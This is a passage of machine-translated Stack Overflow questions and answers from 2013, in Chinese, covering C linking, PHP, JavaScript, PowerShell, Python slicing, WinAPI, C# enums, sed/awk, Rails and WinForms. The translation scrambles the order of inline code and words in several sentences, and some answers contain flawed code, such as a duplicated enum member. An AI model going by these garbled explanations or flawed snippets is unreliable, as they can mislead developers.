```

您可以看到生成的程序集中没有调用 to `roundf()`。（您可以生成它`gcc -S filename.c`并读取生成的`filename.s`文件）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:16:16.250

您在评论中提到`libstdc++`，这让我怀疑问题在于您链接的是 with`g++`而不是 with `gcc`。

该`gcc`命令调用编译器和/或链接器。如果您使用它来编译源文件，它通常会确定语言（以及使用哪个编译器前端）。

该`g++`命令类似，但它专门用于 C++；如果它调用链接器，它会根据需要传递参数以链接`libstdc++`C++ 所需的库。

例如，这两个命令，无需链接即可编译：

```
gcc -c foo.cpp
g++ -c foo.cpp 
```

（据我所知）是等效的，但是这些命令：

```
gcc foo.cpp -o foo
g++ foo.cpp -o foo 
```

不是; 前者可能会失败（取决于`foo.cpp`使用的功能）。

事实证明，与`g++`命令不同，该`gcc`命令隐式链接数学库，至少在我系统上的版本中是这样。因此，如果您的 C++ 代码同时使用 C++ 特定功能（例如，`<iostream>`）和数学函数，那么将其与命令链接可能会产生对两者中`gcc`定义的函数的抱怨- 这正是您所看到的。`libstdc++``libm`

如果您与`g++`命令链接，那应该可以解决问题。您可能必须修改您的`Makefile`或等效的，或生成它的任何东西。

（如果这是解决方案，您可能应该将“c++”添加到您问题的标签列表中。）

至于为什么你之前没有遇到这个问题，我说不出来。一些 C（和/或 C++）编译器会隐式链接数学库；需要`-lm`为其他编译器指定可以说是一个错误。

# php - 当我尝试从我得到的 sql 查询中回显一个 php 变量时（资源 id #39）

> ID：16204460
> 
> 赞同：0
> 
> 时间：2013-04-25T00:25:40.527
> 
> 标签：php, sql

我已经在 sql studio manager 中运行了选择，并且我知道有与此帐户关联的数据。

```
$test = sql::query("select ARMCODE, HOLDCODE from ARE.AAS.ME where ARMCODE = 'ADSMANZS01'");

      echo $test; 
```

**视窗服务器 2008 R2**

谁能向我解释为什么我可能会收到此错误？我也尝试对其进行 print_r，并且返回了相同的 Resource id #39。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:36:03.980

这是真的，这不是错误。当您运行查询时，您只需要使用一个句柄。需要先获取行，然后才能使用。我假设您正在使用 PDO 来运行查询。因此，编写这样的代码来访问查询行：

```
$stmt = "select ARMCODE, HOLDCODE from ARE.AAS.ME where ARMCODE = 'ADSMANZS01'";
foreach ($sql::query($stmt) as $row) {
        print_r( $row) . "\n";
    } 
```

# javascript - 如果设置了 localStorage 项，则加载页面；否则重定向

> ID：16204462
> 
> 赞同：0
> 
> 时间：2013-04-25T00:25:51.370
> 
> 标签：javascript, html, local-storage

我正在创建一个简单的 web 应用程序，需要检查您的年龄并同意条款。
为了节省我想使用的数据传输`localStorage`。

问题是当我创建我的链接并调用我的`onclick`函数时，应用程序在当前窗口中加载成人内容并在新窗口中加载年龄验证，当您确认您的年龄时，应用程序进入无限循环，在新窗口中加载成人内容窗户。

成人内容为两页；一个是表格，另一个是结果页面。
我需要将代码添加到那些以及重定向如果`localStorage.getItem()`值是`null`.

但我首先需要确保您进行验证，然后才能进行该步骤。

这是我到目前为止所拥有的：

```
<a href="age.html" target="new" onclick="verCheck()">Order Form</a></li> 
```

```
function verCheck() {
    var LS = localStorage.getItem('ageVerified');

    if (LS == "True") {
        window.location.assign("/orderform.html")
    } else {
        alert("Error")
        window.location.assign("/about.html")
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:31:23.477

`window.location.assign`加载文档，重新加载页面只需将 url 分配给`window.location.replace`

```
function verCheck(){
    var LS = localStorage.getItem('ageVerified');
    if (LS == "True") {
        window.location.assign("/orderform.html")
    } else{
        alert("Error")
        window.location.replace("/about.html");
    }
} 
```

# powershell - 为什么返回到 PowerShell 时批处理退出代码会损坏？

> ID：16204463
> 
> 赞同：2
> 
> 时间：2013-04-25T00:25:59.380
> 
> 标签：powershell, exit-code

在 powershell 中运行此代码会产生奇怪的结果：

```
PS> .\test.bat; $lastexitcode
>exit /b 0
2

PS> cmd /c exit /b 0; $lastexitcode
0 
```

有人可以解释如何更正批处理文件版本吗？我还想指出，除了`0`正常工作之外的退出值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:03:37.497

我能够`exit /b <code>`在 PSv2 中重现使用，它似乎在 PSv3 中按预期工作。对于 PSv2，当我删除 which mean 时，它按预期开始`/b`工作`When used in a batch script, this option will exit only the script (or subroutine) but not CMD.EXE`。

围绕 PowerShell 错误地处理退出代码报告了许多问题： [https ://connect.microsoft.com/PowerShell/SearchResults.aspx?SearchQuery=exit%2520code](https://connect.microsoft.com/PowerShell/SearchResults.aspx?SearchQuery=exit%2520code)

我没有特别看到这一点，但这并不是说它在 PSv3 中没有修复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:52:39.957

所有这些解决方案都有效。如果有人可以解释，我将不胜感激：

```
PS> & cmd.exe /c 'test.bat && exit'; $lastexitcode
>exit /b 0
0

PS> cmd.exe /c 'test.bat && exit'; $lastexitcode
>exit /b 0
0 
```

# c - getline() 失败后是否需要调用 free()？

> ID：16204473
> 
> 赞同：7
> 
> 时间：2013-04-25T00:26:44.770
> 
> 标签：c, malloc

以下块导致内存泄漏：

```
FILE *fp = fopen(path, "r");
char *line = NULL;
size_t len = 0;
ssize_t read = -1;

while ((read = getline(&line, &len, fp)) != -1) {
        /*Do something*/
} 
```

> 1个块中的120个字节肯定会丢失......
> 
> ...getline (getline.c:34)

我可以通过添加一个来解决这个问题`free()`：

```
while ((read = getline(&line, &len, fp)) != -1) {
        /*Do something*/
}
free(line); 
```

**我的问题是**：为什么在失败时`getline`分配内存？`line`为什么我不需要`free(line)`每次来电`getline`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T00:30:50.903

设置是这样的，您可以将先前分配的内存块传递给，如果需要，[`getline()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/getline.html)它将分配更多 ( )。`realloc()`（或者你可以从不分配内存开始，就像这里一样。）它可以报告失败或 EOF，但不会释放分配的空间——因此你需要释放它。如果该文件是一个空文件，并且您从没有数据开始，您可能不会分配任何空间；另一方面，它可能在尝试从文件中获取数据之前分配了一些空间。

但是您知道，如果`line`指针不为空，则它已被分配并且必须被释放。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:53:32.693

getline 可能会以几种不同的方式失败，并且在失败时可能会或可能不会重新分配内存一次或多次。为了保持一致，它永远不会释放内存——请参阅[http://www.opensource.apple.com/source/cvs/cvs-19/cvs/lib/getline.c上的一种可能实现](http://www.opensource.apple.com/source/cvs/cvs-19/cvs/lib/getline.c)

这种一致性使得实现和调用者都更容易......您只需始终释放该行，而不必检查错误代码以查看是否释放它。

# youtube-api - 如何在本地从 jsfiddle 运行保存的 html？

> ID：16204477
> 
> 赞同：0
> 
> 时间：2013-04-25T00:27:06.293
> 
> 标签：youtube-api, youtube-javascript-api

我正在尝试在本地运行 jsfiddle 代码，特别是这个：http: [//jsfiddle.net/BAqTe/](http://jsfiddle.net/BAqTe/)

我环顾四周，人们建议使用“/show”并保存页面并加载依赖项，但它对我来说在本地不起作用。我有 jquery.1.8.3 并且我已经包含了它。“onYouTubeIframeAPIReady”但是永远不会被调用。我需要在本地运行它什么？这是我到目前为止的代码。

```
<html>
<head>
<script type='text/javascript' src="jquery.js"></script>
<script type='text/javascript'>
//<![CDATA[ 

$(window).load(function(){
// Add the API 
var tag = document.createElement('script');
tag.src = "//www.youtube.com/iframe_api";
var firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
// Register the player
var player;
onYouTubeIframeAPIReady = function() {
   player = new YT.Player('ytplayer', {     
                  events: {
         'onReady': onPlayerReady,
'onStateChange': onPlayerStateChange
                          }
                         });
                        }

 // Add some controls (they can't be called before onPlayerReady in real life)
 $('#play').click(function() {    
   player.playVideo();
 });
 $('#pause').click(function() {  
   player.pauseVideo();
 });
 });
 //]]>  
 </script>
 </head>
 <body>
 <iframe class="video-frame" id="ytplayer" src="http://www.youtube.com/embed/RP4abiHdQpc?controls=0&showinfo=0&enablejsapi=1" frameborder="0"></iframe>
 <button id="play">Play</button>
 <button id="pause">Pause</button>
 </body>
 </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:47:27.880

```
onYouTubeIframeAPIReady = function() {
   player = new YT.Player('ytplayer', {     
                  events: {
         'onReady': onPlayerReady,
'onStateChange': onPlayerStateChange
                          }
                         });
                        } 
```

`onYouTubeIframeAPIReady`可能会被调用，但有错误，因为`onPlayerReady`和`onPlayerStateChange`未定义为函数。

从您的 jsfiddle 复制两个缺少的函数，或者不将它们包含为事件。

# python - Python括号子字符串不起作用，为什么？

> ID：16204484
> 
> 赞同：2
> 
> 时间：2013-04-25T00:27:43.257
> 
> 标签：python, python-3.x, substring, square-bracket

我是python新手，做一些测试我发现了这一点。

```
>item="testing315testing08634567890"
>item.index("086")
17
>item[17:10]
''
>item[17:]
'08634567890' 
```

我不明白为什么不工作，而与其他字符串一起工作。请注意，如果我这样做...

```
> item[4:10]
'ing315' 
```

中间的数字会造成麻烦吗？这是一个错误吗？我错过了什么吗？我正在使用 Python 3.3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:32:18.647

列表切片的结束索引是大于开始索引的位置，而*不是*切片的大小！所以你想要这样的东西：

```
item[17:len(item)] 
```

请注意，这与前面的代码片段完全相同：

```
item[17:] 
```

切片的开始索引和结束索引`alist[a:b]`应该像这样解释：切片从位置 in 中的项目开始，到`a`位置 in之前`alist`的一个元素结束。和都是中的*索引*。`b``alist``a``b`*`alist`*

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:31:30.230

当您索引具有这样范围的字符串时，您必须首先放置下限，然后放置上限，如下所示：

```
item[10:17] 
```

可以把它想象成“我想要这个字符串从`a`到`b`（`b`排除在哪里）”，如：

```
some_string[a:b] 
```

如果您希望字符串结束（或从头开始），您可以简单地省略绑定。

这是一个例子：

```
my_string = "test"
my_string[:2]       ==> "te"
my_string[2:]       ==> "st"
my_string[:]        ==> "test"
my_string[1]        ==> "e"
my_string[1:3]      ==> "es" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T01:09:21.783

索引中的第二个数字必须大于第一个数字。例如：

```
item[17:17]
item[17:10]
item[17:17-1] 
```

都会回来，

```
'' 
```

如果您想在匹配的索引之后获取 10 个字符，您可以执行以下操作：

```
>item="testing315testing08634567890"
>item[item.index("086") : item.index("086")+10]
'0863456789' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-17T17:14:32.113

正如其他人所说，第二个参数是一个结束索引。但一个不错的 hack 也可以：

```
list[x:x+len] 
```

所以如果你想要 10 个字符，从 17 开始，如示例中所示：

```
item[17:17+10] will give you the desired result. 
```

注意：这不会导致任何索引错误，但如果字符串比结束索引 (17+10 == 27) 短，它将产生与 item[17:] 相同的结果。接受的答案解决了提出的问题，但如果你想要中间的 10 个：

```
item="testing315testing08634567890some_other_stuff_here"

item[17:] == "08634567890some_other_stuff_here"
item[17:17+10] == "08634567890" 
```

保留 17+10 符号是因为它清楚地表明了意图并允许轻松替换可能直到运行时才知道的变量。*

# multithreading - 检测窗口恢复操作即将开始

> ID：16204488
> 
> 赞同：1
> 
> 时间：2013-04-25T00:28:26.063
> 
> 标签：multithreading, winapi, event-handling, directx

`WM_GETMINMAXINFO`在最大化操作即将开始和`WM_SIZE`最大化操作完成时生成。

`WM_SIZE`还原操作完成时也会生成。

**但是如何检测窗口恢复操作即将开始呢？**

* * *

我需要检测窗口即将恢复的确切时刻，而不是已经恢复的时刻。我正在开发多线程`DirectX`应用程序。我在专用的辅助线程中渲染。当窗口即将开始最大化或恢复时，我需要更改渲染后台缓冲区大小（`DirectX Device` `Reset`）。我只能从主线程调整后台缓冲区的大小，所以我`Critical Sections`用来与渲染线程同步。问题是我不能中断`Present`渲染线程中的操作，当最大化或恢复操作即将开始时，我等到当前`Present`操作完成，然后才开始调整大小（最大化/恢复）。如果您更改后台缓冲区大小太晚（当最大化/恢复操作完成时（`WM_SIZE`消息），您会注意到旧帧的大小错误（图像被拉伸）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T08:14:13.510

好吧，很高兴看到有人仍在思考这些问题。这些小东西，比如调整大小时的一秒钟图像拉伸，将专业外观的应用程序与卧室编码的应用程序区分开来。

在我的旧代码中，我发现了您可能会感兴趣的技巧。第一件事是您可以检查`WM_SYSCOMMAND`：

```
 case WM_SYSCOMMAND:
           {
               switch (wParam)
               {
               case SC_MAXIMIZE:
                   std::cout << "Going to MAXIMIZE: " << std::endl;
                   break;

               case SC_MINIMIZE:
                   std::cout << "Going to MINIMIZE: " << std::endl;

                   break;

               case SC_RESTORE:
                   std::cout << "Going to RESTORE: " << std::endl;
                   break;

               default:
                   break;
               }
               return DefWindowProc(m_hWnd, msg, wParam, lParam);
           } 
```

*但问题是当用户双击 titlebar*时它不会捕获最大化/恢复事件。

所以我发现了一个小技巧，当 parse `WM_WINDOWPOSCHANGING`.

首先让我们做一个有趣的研究。[我们在这里](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632653%28v=vs.85%29.aspx)和[这里](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632612%28v=vs.85%29.aspx)阅读文档，我们发现：

> WM_WINDOWPOSCHANGING 消息发送到大小、位置或在 Z 顺序中的位置*即将更改的窗口*

因为在通用调试器中调试事件几乎是不可能的（如果调试器经常改变窗口的 z 顺序，你将如何测试？），所以为了测试目的，我们将制作一个带有 的小控制台应用程序`int main()`，我们像往常一样初始化一个窗口（HINSTANCE我们可以从`GetModuleHandle(0);`)。所以我们同时有一个控制台和一个窗口。在窗口过程中，我们捕获`WM_WINDOWPOSCHANGING`并打印信息，它会告诉我们，控制台：

```
 case WM_WINDOWPOSCHANGING:
        {
            WINDOWPOS* wp = ((WINDOWPOS*)lParam);

            // We checking current state which is saved in member (or global) bools
            // Set them checking WM_SIZE before
            if (m_bMaximized)
            {
                std::cout << "Currently MAXIMIZED: ";
            }
            else if (m_bMinimized)
            {
                std::cout << "Currently MINIMIZED: ";
            }
            else
            {
                std::cout << "Currently NORMAL: ";
            }

            dbgPrintPositionCurrent();

            std::cout << "Going to change to: ";
            dbgPrintPosition(wp->x, wp->y, wp->cx, wp->cy, wp->flags);
            std::cout << std::endl << std::endl;

            return DefWindowProc(m_hWnd, msg, wParam, lParam);
        } 
```

[请参阅此处](http://pastebin.com/jAh4pDk6)的实用程序函数。

当我们玩得足够多时，我们现在可以让它变得有用：

```
 bool bFrameChanged = ((wp->flags) & SWP_FRAMECHANGED) > 0;
            bool bNoCopyBits = ((wp->flags) & SWP_NOCOPYBITS) > 0;
            bool bNormal = (!m_bMaximized) && (!m_bMinimized);

            // from maximized
            if(m_bMaximized && bFrameChanged && !bNoCopyBits)
            {
                std::cout << " MAXIMIZED -> NORMAL " << std::endl;
            }
            if (m_bMaximized && bFrameChanged && bNoCopyBits)
            {
                std::cout << " MAXIMIZED -> MINIMIZED " << std::endl;
            }

            // from normal states
            if (bNormal && bFrameChanged && !bNoCopyBits)
            {
                std::cout << " NORMAL -> MAXIMIZED " << std::endl;
            }
            if (bNormal && bFrameChanged && bNoCopyBits)
            {
                std::cout << " NORMAL -> MINIMIZED"  << std::endl;
            }

            // from minimized
            if(m_bMinimized && bFrameChanged)
            {
                std::cout << " MINIMIZED -> MAXIMIZED " << std::endl;
            }
            if(m_bMinimized && m_bMaximized && bFrameChanged)
            {
                std::cout << " MINIMIZED -> MAXIMIZED " << std::endl;
            }

            return DefWindowProc(m_hWnd, msg, wParam, lParam); 
```

我真的不确定这是最简单的方法，甚至是正确的方法。但它现在有效 =) 另外，我认为你的应用程序并不关心*到底*发生了什么：最大化、恢复或调整大小。它只关心大小*是否已更改*，因此您需要调整缓冲区大小/重新创建交换链等...

希望能帮助到你！快乐编码！

# excel - 如何将excel列中的所有条目乘以一个数字

> ID：16204505
> 
> 赞同：8
> 
> 时间：2013-04-25T00:30:30.663
> 
> 标签：excel

我有一个列大小很大的 excel 表。我想对该列进行操作（不复制到空白列）并将该列中的所有条目乘以 1000，替换以前的条目。任何帮助表示赞赏。谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T00:42:22.287

这是适合您的解决方案。

您需要做的就是在单元格中写入一个值，复制该值，然后使用`paste special`选项。

[如何将范围单元格乘以Excel中的数字？](http://www.extendoffice.com/documents/excel/697-multiply-excel-cells-by-a-number.html)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T00:40:54.900

您可以将需要相乘的数字放在另一个单元格中，例如在图像中为 B1，然后创建另一列，将第一个数字（图像为 A2）乘以 B1 中的数字，但将公式与 $ B$1 而不是 B1，这将使 B1 值保持不变，然后向下拖动公式，就是它，一个所有条目乘以 B1 的新列。

![在此处输入图像描述](https://i.stack.imgur.com/8XRru.png)

# objective-c - NSView 在添加为子视图后未显示（Cocoa/OSX）

> ID：16204513
> 
> 赞同：2
> 
> 时间：2013-04-25T00:31:49.260
> 
> 标签：objective-c, macos, cocoa, nsview

在我的程序中，我进行了以下设置：

我在界面生成器中制作了 3 个 NSView![在此处输入图像描述](https://i.stack.imgur.com/iEPl8.png)

所以 PaintView 是 PlayerView 的子视图，而 ImageView 是 PlayerView 之上的视图。

当程序启动时 ImageView 是隐藏的。PaintView 是透明的，所以我在它下面看到了 PlayerView，但点击发生在 PaintView 上。到现在为止还挺好。

现在，我想要完成的是，当我按下按钮时，PlayerView 变为隐藏，ImageView 变为可见，PaintView 变为它的子视图。所以我可以通过透明的PaintView看到ImageView，但仍然可以点击PaintView。

到目前为止，我的方法是这样的：

```
// on the app start

[ImageView setHidden: YES];

// on the button press
[PaintView removeFromSuperview];
[PlayerView setHidden:YES];
[ImageView setHidden:NO];
[ImageView addSubview:PaintView positioned:NSWindowAbove relativeTo:nil]; 
```

不幸的是，这并没有给我想要的结果。ImageView 在最上面，所以我不能点击 PaintView。

有谁知道我做错了什么？！任何形式的帮助都非常感谢！

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T02:39:41.423

removeFromSuperview 释放该对象及其包含的所有内容。在您尝试将其添加到另一个视图时，检查 PaintView 是否为零。

# c# - C# 枚举 - 根据掩码检查标志

> ID：16204519
> 
> 赞同：8
> 
> 时间：2013-04-25T00:32:30.737
> 
> 标签：c#, .net, enums, flags, enum-flags

我有以下枚举标志：

```
[Flags]
private enum MemoryProtection: uint
{
    None             = 0x000,
    NoAccess         = 0x001,
    ReadOnly         = 0x002,
    ReadWrite        = 0x004,
    WriteCopy        = 0x008,
    Execute          = 0x010,
    ExecuteRead      = 0x020,
    ExecuteReadWrite = 0x040,
    ExecuteWriteCopy = 0x080,
    Guard            = 0x100,
    NoCache          = 0x200,
    WriteCombine     = 0x400,
    Readable         = (ReadOnly | ReadWrite | ExecuteRead | ExecuteReadWrite),
    Writable         = (ReadWrite | WriteCopy | ExecuteReadWrite | ExecuteWriteCopy)
} 
```

现在我有一个枚举实例，我需要检查它是否可读。如果我使用以下代码：

```
myMemoryProtection.HasFlag(MemoryProtection.Readable) 
```

在我的情况下它总是返回 false 因为我认为 HasFlag 检查它是否有每个标志。我需要一些优雅的东西来避免这样做：

```
myMemoryProtection.HasFlag(MemoryProtection.ReadOnly)         ||
myMemoryProtection.HasFlag(MemoryProtection.ReadWrite)        ||
myMemoryProtection.HasFlag(MemoryProtection.ExecuteRead)      ||
myMemoryProtection.HasFlag(MemoryProtection.ExecuteReadWrite) 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T00:41:29.533

您可以翻转条件，并检查复合材料`enum`是否具有标志，而不是检查复合材料的标志，如下所示：

```
if (MemoryProtection.Readable.HasFlag(myMemoryProtection)) {
    ...
} 
```

这是一个例子：

```
MemoryProtection a = MemoryProtection.ExecuteRead;
if (MemoryProtection.Readable.HasFlag(a)) {
    Console.WriteLine("Readable");
}
if (MemoryProtection.Writable.HasFlag(a)) {
    Console.WriteLine("Writable");
} 
```

这打印`Readable`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T00:41:40.567

尝试按位运算符：

```
[TestMethod]
public void FlagsTest()
{
    MemoryProtection mp = MemoryProtection.ReadOnly | MemoryProtection.ReadWrite | MemoryProtection.ExecuteRead | MemoryProtection.ExecuteReadWrite;
    MemoryProtection value = MemoryProtection.Readable | MemoryProtection.Writable;
    Assert.IsTrue((value & mp) == mp);
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-25T00:53:10.393

是的，`hasFlag`检查是否设置了每个位字段（标志）。

与其将`Readable`其视为名称中包含的所有保护措施的组合`Read`，您能否扭转组合？例如

```
[Flags]
private enum MemoryProtection: uint
{
    NoAccess         = 0x000,
    Read             = 0x001,
    Write            = 0x002,
    Execute          = 0x004,
    Copy             = 0x008,
    Guard            = 0x010,
    NoCache          = 0x020,
    ReadOnly         = Read,
    ReadWrite        = (Read | Write),
    WriteCopy        = (Write | Copy),
    // etc.
    NoAccess         = 0x800
} 
```

然后你可以编写如下代码：

```
myMemoryProtection.HasFlag(MemoryProtection.Read) 
```

# bash - Bash：在文件中的另一个字符串之前查找一个字符串

> ID：16204522
> 
> 赞同：1
> 
> 时间：2013-04-25T00:33:17.863
> 
> 标签：bash, sed, grep

我试图在另一个字符串之前找到前面的字符串。例如：

```
StringA <stuff 1>
StringA <stuff 2>
StringD
...
StringB <stuff 3>
StringA <stuff 4>
StringA <stuff 5>
StringA <stuff 6>
StringD
StringB <stuff 7> 
```

我想在文件中找到所有在 StringB 之前的“StringA”。

此示例中的输出将是：

```
StringA <stuff 2>
StringA <stuff 6> 
```

我可以使用以下方法找到所有 StringB 的行号： grep -n "StringB"

然后我可以使用 sed -n 1,$line_numberp 这使我从第 1 行转到 StringB 行。我做 grep "StringA" | 尾-n1

这似乎可行，但有点麻烦。请问有没有更好的方法来达到预期的结果？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:45:46.443

```
grep "\(StringA\|StringB\)" $file_name | grep -B 1 StringB | grep StringA 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:45:25.403

```
sed '/String[AB]/!d' input | 
   sed -n -e '/StringA/{:l /StringA/h;n;/StringB/{x;p;b};bl}' 
```

附评论：

```
sed '/String[AB]/!d' input |      # remove lines not containing StringA/B
   sed -n -e '/StringA/{          # if line contains StringA, then
      :l                          # loop until StringB
          /StringA/h;             # keep the most recent A in the hold space
          n;                      # read a newline (overwrite pattern space)
          /StringB/!bl;           # loop up...
          x;p;b                   # get the most recent A, and print
   }' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T01:14:44.907

使用 awk ：

```
awk '/^StringB/ { if(lastline ~ /^StringA/) {print lastline }} {lastline=$0}' $file 
```

StringA 和 StringB 可以是正则表达式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T06:01:23.183

这可能对您有用（GNU sed）：

```
sed ':a;$!N;/^StringA/!D;/^\(StringA\).*\n\1/D;/.*StringB/!ba;P;D' file 
```

这将删除保留最后一行的重复`StringA`行，并在遇到`StringB`一行时打印出模式空间中的第一个字符串。

# ruby-on-rails - 多态关联 - 如何创建主索引页面

> ID：16204523
> 
> 赞同：0
> 
> 时间：2013-04-25T00:33:24.330
> 
> 标签：ruby-on-rails, polymorphic-associations

我正在创建一个应用程序，允许用户对创建的项目发布发表评论。我按照这个[Railscast](http://railscasts.com/episodes/154-polymorphic-association?)设置了多态关联。

根据教程，控制器中的索引页面设置如下，将您带到 localhost:3000/projects/1/comments。

**问题：我如何路由它并调整控制器中的 def 索引，以便我可以将索引路由到 localhost:3000/comments，因为我想创建一个列出所有评论的视图，而不管它发布在哪个项目上？因为现在，根据下面的路由和代码，当我转到 localhost:3000/comments 时，我收到以下错误：**

```
ActiveRecord::RecordNotFound in CommentsController#index
Couldn't find Comment without an ID
app/controllers/comments_controller.rb:32:in `load_commentable' 
```

/app/controllers/comments_controller.rb

```
class CommentsController < ApplicationController

before_filter :load_commentable
    def index
        @comments = @commentable.comments
    end

private
    def load_commentable
        resource, id = request.path.split('/')[1,2]
        @commentable = resource.singularize.classify.constantize.find(id)
    end
end 
```

路线.rb

```
resources :projects do
    resources :comments
end

resources :comments 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:35:47.140

设置您的 routes.rb 文件，如下所示：

```
resources :projects do
  resources :comments
end

resources :comments 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:34:46.380

如果您将`index`操作路由到 localhost:3000/comments，听起来您正在使用命名路由（即“comments”而不是“index”）。如果您使用的是命名路由，您是否在`routes.rb`文件中指定了要执行的控制器操作？例如，你应该有：

```
match 'comments' => 'comments#index' 
```

并且您的视图文件的标题应为`index.html.erb`.

此外，如果您要嵌套评论资源，您仍然需要声明

```
resources :comments, only: :index                     # not nested 
```

为您的工作路线。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-02T22:36:36.767

为了解决这个问题，我创建了一个新的控制器页面：

路由.rb

```
match 'comments' => 'comments#admin' 
```

评论控制器.rb

```
def admin
    @newcomments = Newcomment.newest.page(params[:page]).per_page(10)
end 
```

# c# - 仅使用用户控件时如何在主表单面板中显示用户控件？

> ID：16204525
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:34:11.507
> 
> 标签：c#, winforms

@Mark，是的，先生，我在用户控件中创建了一个事件。这是我的代码：

**用户控制**

```
namespace Purchase_Order
{
    public partial class Static : UserControl
    {
        public event EventHandler ClassificationClicked;
        public Static()
        {
            InitializeComponent();
        }

        private void btnClassification_Click(object sender, EventArgs e)
        {
            ClassificationClicked(sender, e);
        }
    }
} 
```

**主窗体**

```
public partial class formMain : Form
{

    public formMain()
    {
        InitializeComponent();
        Static.ClassificationClicked += new EventHandler(Static_ClassificationClicked); 
    }

    private void formMain_Load(object sender, EventArgs e)
    {
        Static control = new Static();
        panelSide.Controls.Clear();
        panelSide.Controls.Add(control);   
    }

    void  Static_ClassificationClicked(object sender, EventArgs e)
    {
        classification control = new classification();
        panelMain.Controls.Clear();
        panelMain.Controls.Add(control);
    }

} 
```

这是错误-> Static.ClassificationClicked += new EventHandler(Static_ClassificationClicked);

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:54:04.517

就我个人而言，我会在您的 UserControl 上创建一个事件并在您的 MainForm 中订阅它。在我看来，UserControl 了解父表单是不合适的。像这样的东西：

**将事件添加到您的 UserControl：**

```
public partial class UserControl1 : UserControl
{
    public event EventHandler ClassificationClicked;
    public UserControl1()
    {
        InitializeComponent();
    }

    private void btnClassification_Click(object sender, EventArgs e)
    {
        ClassificationClicked(sender, e);
    }
} 
```

**在您的 MainForm 中订阅它**

```
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
        userControl11.ClassificationClicked += new EventHandler(userControl11_ClassificationClicked);
    }

    void userControl11_ClassificationClicked(object sender, EventArgs e)
    {
        classification control = new classification();
        panelMain.Controls.Clear();
        panelMain.Controls.Add(control);

    }
} 
```

* * *

根据评论流进行编辑。我还将确保您的用户控件具有唯一的名称，而不仅仅是控件，这样您就可以区分它们。

```
public partial class formMain : Form
{
    Static staticControl;
    Classification classificationControl;

    public formMain()
    {
        InitializeComponent();
        staticControl= new Static();
        panelSide.Controls.Clear();
        panelSide.Controls.Add(staticControl);
        staticControl.ClassificationClicked += new EventHandler(Static_ClassificationClicked); 
    }

    void  Static_ClassificationClicked(object sender, EventArgs e)
    {
        classificationControl = new classification();
        panelMain.Controls.Clear();
        panelMain.Controls.Add(classificationControl);
    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:51:07.417

我假设这`btnClassification_Click`是您的用户控件上的一个方法`static`，它位于您的`formMain`.

您的问题是，在您的`btnClassification_Click`方法中，您创建了一个新的`formMain`类实例，而不是访问您的`static`用户控件所在的实例。`mainPanel`看起来你已经在类中公开了`formMain`，所以你只需要找到`formMain`类的正确实例来添加你的用户控件。为此，请将此方法放在您的`static`用户控件中：

```
private Form GetParentForm()
{
    Control current = this.Parent;
    while (current != null)
    {
        Form form = current as Form;
        if (form != null)
        {
            return form;
        }

        current = current.Parent;
    }

    return null;
} 
```

然后从您的事件处理程序调用此方法：

```
private void btnClassification_Click(object sender, EventArgs e)
{
    classification control = new classification();
    formMain main = (formMain)this.GetParentForm();
    main.panelMain.Controls.Clear();
    main.panelMain.Controls.Add(control);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T02:34:15.283

[Mark Hall 的](https://stackoverflow.com/a/16205612/80274)回答是最好的，但是我想补充一点，您不应该直接引发事件，而是首先检查是否有订阅者然后引发事件。如果还没有人订阅该事件，这将停止一个空引用异常。

```
public partial class UserControl1 : UserControl
{
    public event EventHandler ClassificationClicked;
    public UserControl1()
    {
        InitializeComponent();
    }

    private void btnClassification_Click(object sender, EventArgs e)
    {
        RaiseClassifactionClicked();
    }

    private RaiseClassifactionClicked()
    {
        var tmp = ClassificationClicked; //This is added for thread safty
        if(tmp != null) //check to see if there are subscribers, if there are tmp will not be null
           tmp(this, EventArgs.Empty); //You don't need to pass along the sender and e, make your own here.
    }
} 
```

有关线程安全技巧的更多信息，请阅读[这篇文章](http://blogs.msdn.com/b/ericlippert/archive/2009/04/29/events-and-races.aspx)

# haskell - 如何根据 IO Int 值对列表进行排序

> ID：16204528
> 
> 赞同：2
> 
> 时间：2013-04-25T00:34:26.917
> 
> 标签：haskell, monads

